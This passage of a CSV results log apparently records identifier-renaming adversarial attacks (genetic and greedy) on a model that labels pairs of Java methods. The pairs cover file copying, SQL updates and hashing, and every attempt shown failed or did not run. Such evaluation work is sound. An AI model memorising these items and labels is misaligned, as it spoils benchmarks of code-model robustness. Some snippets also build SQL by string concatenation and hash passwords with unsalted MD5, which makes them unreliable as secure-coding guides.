Index,Original Code,Program Length,Adversarial Code,True Label,Original Prediction,Adv Prediction,Is Success,Extracted Names,Importance Score,Greedy No. Changed Names,Greedy No. Changed Tokens,Replaced Names,GA No. Changed Names,GA No. Changed Tokens,Attack Type,Query Times,Time Cost,Suc Type,Insert Words
0,"    public MotixFileItem(final InputStream is, final String name, final String contentType, final int index) throws IOException {
        this.name = name;
        this.contentType = contentType;
        this.index = index;
        this.extension = FilenameUtils.getExtension(this.name);
        this.isImage = ImageUtils.isImage(name);
        ArrayInputStream isAux = null;
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            IOUtils.copy(is, out);
            isAux = new ArrayInputStream(out.toByteArray());
            if (this.isImage) {
                this.bufferedImage = imaging.read(isAux);
            }
        } finally {
            IOUtils.closeQuietly(out);
            IOUtils.closeQuietly(isAux);
        }
        this.inputStream = new ArrayInputStream(out.toByteArray());
    }
 <SPLIT>     public static String getPagina(String strurl) {
        String resp = """";
        Authenticator.setDefault(new Autenticador());
        try {
            URL url = new URL(strurl);
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String str;
            while ((str = in.readLine()) != null) {
                resp += str;
            }
            in.close();
        } catch (MalformedURLException e) {
            resp = e.toString();
        } catch (IOException e) {
            resp = e.toString();
        } catch (Exception e) {
            resp = e.toString();
        }
        return resp;
    }
",153,,LABEL_0,LABEL_0,LABEL_0,-1,"is,name,contentType,index,extension,isImage,isAux,out,bufferedImage,inputStream",,,,0,,0,GA,3275,1.1871298829714456,failed,[]
1,"    public static void updatePicInfo(Connection conn, int nr, int lock, DBPicInfo picInfo) throws SQLException {
        String sql = """";
        PreparedStatement pstmt = null;
        try {
            if (!picInfo.getName().equals("""")) {
                sql = ""update DBPic set name=? where bnr=?"";
                pstmt = conn.prepareStatement(sql);
                pstmt.setString(1, picInfo.getName());
                pstmt.setInt(2, nr);
                pstmt.executeUpdate();
            }
            if (picInfo.getRate() != 0) {
                sql = ""update DBPic set rate=? where bnr=?"";
                pstmt = conn.prepareStatement(sql);
                pstmt.setInt(1, picInfo.getRate());
                pstmt.setInt(2, nr);
                pstmt.executeUpdate();
            }
            sql = ""update DBThumb set thumb_lock=? where bnr=?"";
            pstmt = conn.prepareStatement(sql);
            pstmt.setInt(1, lock);
            pstmt.setInt(2, nr);
            pstmt.executeUpdate();
            if (picInfo.getCategories() != null) {
                sql = ""delete from Zuordnen where bnr=?"";
                pstmt = conn.prepareStatement(sql);
                pstmt.setInt(1, nr);
                pstmt.executeUpdate();
                DaoUpdate.insertPicInCategories(conn, nr, picInfo.getCategories());
            }
            if (picInfo.getKeywords() != null) {
                sql = ""delete from Haben where bnr=?"";
                pstmt = conn.prepareStatement(sql);
                pstmt.setInt(1, nr);
                pstmt.executeUpdate();
                DaoUpdate.insertPicInKeywords(conn, nr, picInfo.getKeywords());
            }
            conn.commit();
        } catch (SQLException e) {
            conn.rollback();
            throw e;
        } finally {
            pstmt.close();
        }
    }
 <SPLIT>         private boolean doCSVImport(String tableName, final boolean hasHeader) {
            StringBuffer sql = new StringBuffer();
            sql.append(""INSERT INTO "");
            sql.append(tableName + ""("");
            for (int i = 0; i < colNames.size(); i++) {
                sql.append("""" + colNames.get(i) + "","");
            }
            sql.setLength(sql.length() - 1);
            sql.append("") VALUES( "");
            for (int i = 0; i < colNames.size(); i++) {
                sql.append(""?,"");
            }
            sql.setLength(sql.length() - 1);
            sql.append("")"");
            Connection conn = null;
            int lineNumber = 0;
            int colNumber = 0;
            String line[] = null;
            try {
                conn = DBExplorer.getConnection(false);
                conn.setAutoCommit(false);
                PreparedStatement pstmt = conn.prepareStatement(sql.toString());
                for (; lineNumber < csvData.size(); lineNumber++) {
                    if (hasHeader && lineNumber == 0) continue;
                    dlg.UpdateProgressBar(lineNumber);
                    if (cancel) {
                        break;
                    }
                    line = (String[]) csvData.get(lineNumber);
                    pstmt.clearParameters();
                    for (colNumber = 0; colNumber < colTypes.size(); colNumber++) {
                        if (line[colNumber].equals("""") && colNullAllowed.get(colNumber).toString().equals(""true"")) {
                            pstmt.setNull(colNumber + 1, Integer.parseInt(colTypeInt.get(colNumber).toString()));
                        } else {
                            pstmt.setObject(colNumber + 1, line[colNumber], Integer.parseInt(colTypeInt.get(colNumber).toString()));
                        }
                    }
                    pstmt.executeUpdate();
                }
                if (cancel) conn.rollback(); else conn.commit();
                conn.setAutoCommit(true);
                conn.close();
                conn = null;
                dialog.getDisplay().asyncExec(new Runnable() {

                    public void run() {
                        if (!cancel) {
                            dlg.showMessage(title, ""Imported "" + maxsize + "" rows successfully."");
                            statusLabel.setText(""Import complete."");
                        } else {
                            dlg.UpdateProgressBar(0);
                            statusLabel.setText(""Import aborted."");
                        }
                    }
                });
                return true;
            } catch (final Exception e) {
                if (conn != null) try {
                    conn.rollback();
                } catch (SQLException e1) {
                    e1.printStackTrace();
                }
                dialog.getDisplay().asyncExec(new Runnable() {

                    public void run() {
                        statusLabel.setText(""Import failed"");
                        dlg.showError(title, e.getMessage());
                        dlg.UpdateProgressBar(0);
                    }
                });
                return false;
            } finally {
                if (conn != null) try {
                    conn.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }
",335,,LABEL_1,LABEL_0,,-4,"updatePicInfo,conn,nr,lock,picInfo,sql,pstmt",,,,0,,0,Greedy,1,0.0008053859074910482,,[]
2,"    private void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>         private void loadBinaryStream(String streamName, InputStream streamToLoad, long sz, HttpServletRequest req, HttpServletResponse resp) throws IOException {
            resp.setContentType(getContentType(req, streamName));
            resp.setHeader(""Content-Disposition"", ""inline;filename="" + streamName);
            resp.setContentLength((int) sz);
            OutputStream out = resp.getOutputStream();
            BufferedOutputStream bos = new BufferedOutputStream(out, 2048);
            try {
                IOUtils.copy(streamToLoad, bos);
            } finally {
                IOUtils.closeQuietly(streamToLoad);
                IOUtils.closeQuietly(bos);
            }
            getCargo().put(GWT_ENTRY_POINT_PAGE_PARAM, null);
        }
",96,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,in,out,inChannel,outChannel",,,,0,,0,GA,1862,0.6623463749885559,failed,[]
3,"    public static final synchronized String hash(String data) {
        if (digest == null) {
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException nsae) {
                log.error(""Failed to load the MD5 MessageDigest. "" + ""Jive will be unable to function normally."", nsae);
            }
        }
        try {
            digest.update(data.getBytes(""utf-8""));
        } catch (UnsupportedEncodingException e) {
            log.error(e);
        }
        return encodeHex(digest.digest());
    }
 <SPLIT>     @Override
    public String getMessageDigest() throws SarasvatiLoadException {
        if (messageDigest == null) {
            Collections.sort(nodes);
            Collections.sort(externals);
            try {
                MessageDigest digest = MessageDigest.getInstance(""SHA1"");
                digest.update(name.getBytes());
                for (XmlNode node : nodes) {
                    node.addToDigest(digest);
                }
                for (XmlExternal external : externals) {
                    external.addToDigest(digest);
                }
                messageDigest = SvUtil.getHexString(digest.digest());
            } catch (NoSuchAlgorithmException nsae) {
                throw new SarasvatiException(""Unable to load SHA1 algorithm"", nsae);
            }
        }
        return messageDigest;
    }
",98,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,data,digest",,,,0,,0,GA,541,0.19567012786865234,failed,[]
4,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     private static String encrypt(String password, String encryptType) {
        try {
            MessageDigest md = MessageDigest.getInstance(encryptType);
            md.update(password.getBytes());
            byte[] hash = md.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < hash.length; i++) {
                if ((0xff & hash[i]) < 0x10) {
                    hexString.append(""0"" + Integer.toHexString((0xFF & hash[i])));
                } else {
                    hexString.append(Integer.toHexString(0xFF & hash[i]));
                }
            }
            password = hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return password.toUpperCase();
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,2258,0.8206334670384725,failed,[]
5,"    public void extractResourceToFile(String resourcePath, File dest) {
        InputStream in = getClass().getResourceAsStream(resourcePath);
        try {
            FileOutputStream out = FileUtils.openOutputStream(dest);
            try {
                IOUtils.copy(in, out);
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
 <SPLIT>     public boolean actualizarDatosPrevia(int idJugadorDiv, int idRonda, int idPareoRival, int color, int flotante) {
        int intResult = 0;
        String sql = ""UPDATE jugadorxdivxronda "" + "" SET idPareoRival = "" + idPareoRival + "" , color = "" + color + "" , flotante = "" + flotante + "" "" + "" WHERE jugadorxDivision_idJugadorxDivision = "" + idJugadorDiv + "" AND ronda_numeroRonda = "" + idRonda;
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            intResult = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (intResult > 0);
    }
",84,,LABEL_0,LABEL_0,LABEL_0,-1,"extractResourceToFile,resourcePath,dest,in,out",,,,0,,0,GA,1897,0.6754580100377401,failed,[]
6,"    public void extractResourceToFile(String resourcePath, File dest) {
        InputStream in = getClass().getResourceAsStream(resourcePath);
        try {
            FileOutputStream out = FileUtils.openOutputStream(dest);
            try {
                IOUtils.copy(in, out);
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
 <SPLIT>     public void execute(File sourceFile, File destinationFile, String conversionType, Properties java2HtmlConfig) {
        FileReader reader = null;
        Writer writer = null;
        try {
            reader = new FileReader(sourceFile);
            logger.info(""Using source file: "" + trimPath(userDir, sourceFile));
            if (!destinationFile.getParentFile().exists()) {
                createDirectory(destinationFile.getParentFile());
            }
            writer = new FileWriter(destinationFile);
            logger.info(""Destination file:  "" + trimPath(userDir, destinationFile));
            execute(reader, writer, conversionType, java2HtmlConfig);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                    writer = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (reader != null) {
                try {
                    reader.close();
                    reader = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
",84,,LABEL_1,LABEL_1,LABEL_1,-1,"extractResourceToFile,resourcePath,dest,in,out",,,,0,,0,GA,1467,0.5278642972310384,failed,[]
7,"    private void load() throws SQLException {
        Connection conn = null;
        Statement stmt = null;
        try {
            conn = FidoDataSource.getConnection();
            conn.setAutoCommit(false);
            stmt = conn.createStatement();
            ClearData.clearTables(stmt);
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (100, 'Living Thing')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (200, 'Inanimate Object')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (300, 'Dog')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (400, 'Sheltie')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (500, 'Eskimo')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (600, 'Person')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (700, 'Collar')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (800, 'Ball')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (401, 'Fido')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (501, 'Samantha')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (801, 'A collar')"");
            stmt.executeQuery(""select setval('objects_objectid_seq', 1000)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('hasa', 2)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('partof', 2)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (100, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (200, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (300, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (400, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (500, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (600, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (700, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (800, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'instance', 400)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (501, 'instance', 500)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (801, 'instance', 800)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'hasa', 801)"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('color')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('weight')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('green', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('blue', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('light', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('heavy', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('short', 'length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('long', 'length')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'light')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'short')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (801, 'blue')"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('LEFT-WALL', '1', 'AV+ | NP+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('the', '1', 'D+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('big', '1', 'ADJ+', 400)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('dog', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 700)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('run', '1', '[S-] & AV- & [PREP+]', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('across', '1', 'PREP- & PO+', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('street', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 800)"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('with', 100, 'hasa')"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('in', 200, 'partof')"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 1, 'good', 'best', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 2, '*y', '*iest', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 3, '*e', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 4, '*', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 1, 'good', 'better', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 2, '*y', '*ier', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 3, '*e', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 4, '*', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 1, '*s', '*s\\'', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 2, '*', '*\\'s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 1, 'be', 'being', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 2, '*Vy', '*Vying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 3, '*c', '*cking', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 4, '*VVC', '*VVCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 5, '*VC', '*VCCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 6, '*ie', '*ying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 7, '*e', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 8, '*', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 1, 'sing', 'sang', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 2, 'give', 'gave', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 3, 'swim', 'swam', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 5, 'run', 'ran', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 6, 'do', 'did', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 7, 'be', 'was', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 8, 'throw', 'threw', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 9, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 10, '*c', '*cked', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 11, '*VVC', '*VVCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 12, '*VC', '*VCCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 13, '*y', '*ied', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 14, '*oe', '*oed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 15, '*e', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 16, '*', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 1, 'sing', 'sung', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 2, 'give', 'given', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 3, 'swim', 'swum', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 5, 'do', 'done', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 6, 'be', 'been', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 7, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 8, '*e', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 9, '*', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 1, 'be', 'am', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 1, 'be', 'are', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 1, 'be', 'is', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 2, 'have', 'has', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 3, 'do', 'do', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 4, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 5, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 6, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 7, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 8, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 9, '*s', '*ses', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 10, '*o', '*oes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 11, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 1, 'be', 'are', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 1, 'be', 'are', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 1, 'leaf', 'leaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 2, 'knife', 'knives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 3, 'elf', 'elves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 4, 'half', 'halves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 5, 'loaf', 'loaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 6, 'shelf', 'shelves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 7, 'wife', 'wives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 8, 'person', 'people', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 9, 'deer', 'deer', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 10, 'child', 'children', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 11, '*Co', '*Coes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 12, '*s', '*ses', TRUE)"");
